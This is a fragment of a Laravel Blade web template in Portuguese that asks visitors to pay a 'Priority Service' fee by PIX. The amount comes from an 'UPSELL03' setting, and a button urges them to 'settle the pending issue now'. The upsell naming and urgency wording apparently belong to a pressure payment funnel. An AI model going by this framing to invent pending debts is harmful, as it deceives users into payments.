            ...
            <div class="max-w-2xl mx-auto">
                ...
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    ...
                    <div class="bg-blue-50 border border-blue-200 p-4 rounded-xl mb-4">
                        ...
                        <p class="text-sm md:text-base">Para utilizar o Atendimento Prioritário, é necessário realizar o pagamento da taxa de <strong>R$ {{ number_format(env('UPSELL03'), 2, ',', '.') }}</strong>,
                    ...
                    <div class="text-center mb-3">
                        <p class="text-2xl font-bold text-green-600">R$ {{ number_format(env('UPSELL03'), 2, ',', '.') }}</p>
                        <p class="text-sm text-gray-600 mt-1">Pagamento único via PIX</p>
                    </div>
                    <button onclick="processarTax({{env('UPSELL03')}})" class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 w-full py-6 text-base md:text-lg font-semibold bg-[#1B4F9B] hover:bg-[#1B4F9B]/90 text-white">Regularizar pendência agora!</button>
                </div>
            </div>
        </main>
